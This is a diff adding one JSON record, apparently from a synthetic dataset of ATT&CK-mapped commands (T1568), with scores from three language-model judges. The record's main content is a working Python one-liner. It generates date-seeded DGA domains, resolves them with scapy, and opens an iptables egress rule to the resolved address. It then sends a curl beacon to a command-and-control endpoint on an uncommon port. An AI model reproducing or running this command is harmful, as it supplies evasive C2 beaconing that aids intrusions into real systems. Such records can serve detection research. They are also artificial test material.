@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import random,datetime,hashlib,subprocess; from scapy.all import IP,UDP,DNS,DNSQR,sr1\nseed='ops-key'; tlds=['com','net','org','biz']\ndef dga(n):\n    base=str(datetime.datetime.utcnow().date())+seed\n    return [hashlib.sha256((base+str(i)).encode()).hexdigest()[:12]+'.'+tlds[i%len(tlds)] for i in range(n)]\nresolvers=['8.8.8.8','1.1.1.1']\nip=None; dom=None; port=random.choice([8443,2053,8088,10443])\nfor d in dga(20):\n    got=False\n    for r in resolvers:\n        resp=sr1(IP(dst=r)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=d,qtype='A')),timeout=2,verbose=0)\n        if resp and resp[DNS] and resp[DNS].an:\n            for a in resp[DNS].an:\n                if getattr(a,'type',0)==1:\n                    ip=a.rdata; dom=d; got=True; break\n        if got: break\n    if got: break\nif ip and dom:\n    subprocess.run(['iptables','-I','OUTPUT','-p','tcp','-d',ip,'--dport',str(port),'-j','ACCEPT'])\n    subprocess.run(['curl','-sS','--connect-timeout','3','-A','curl/7.79',f'http://{dom}:{port}/ping'])\n    print(dom,ip,port)\"",
+  "explanation": "Generates DGA domains, resolves one via DNS, then whitelists and probes an irregular high-port C2 endpoint to reduce detection.",
+  "rationale_steps": [
+    "Use DGA seeded by current UTC date to create ephemeral domains.",
+    "Resolve candidates with scapy DNS queries against multiple public resolvers.",
+    "Pick first A record and open egress via iptables only to that IP and a high, uncommon port.",
+    "Validate reachability with a curl beacon using a benign user agent."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1568-c17789a5-c0ea71a4",
+  "source_prompt_hash": "c17789a5",
+  "timestamp_utc": "2025-09-30T09:50:51.932802Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed python3 -c code with balanced quoting, valid scapy/curl/iptables usage, and proper separators.",
+        "semantic_score": 3,
+        "semantic_justification": "Implements DGA-based dynamic resolution and conditional probing consistent with T1568, but scapy DNS packets and iptables typically require root and generated domains are unlikely to resolve, limiting practical execution under stated privileges.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T06:40:12.583454Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The Python code is logically well-structured and parseable, but embedding multi-line Python with newlines inside a shell -c string without explicit line continuation or semicolons between top-level statements (e.g., the seed/tlds assignments after the import line) could cause issues depending on shell quoting, making it a minor but real formatting concern.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements T1568 DGA behavior: it generates 20 date-seeded SHA256-based domain names, resolves them via legitimate public DNS resolvers using raw DNS packets (Scapy), selects a live C2 endpoint, dynamically chooses a non-standard port from a rotation list, whitelists the resolved IP via iptables, and beacons to it with a disguised User-Agent — all consistent with the described technique and explanation.",
+        "combined_score": 4.5,
+        "confidence": 0.88,
+        "timestamp": "2026-02-19T00:25:10.824354Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python code is perfectly well-formed, using correct syntax for list comprehensions, Scapy packet crafting, and subprocess calls with balanced quoting and delimiters.",
+        "semantic_score": 4,
+        "semantic_justification": "The command accurately implements a DGA and dynamic resolution; however, it requires root privileges for Scapy raw sockets and iptables, and depends on the non-standard 'scapy' library being installed.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-19T00:25:15.537922Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
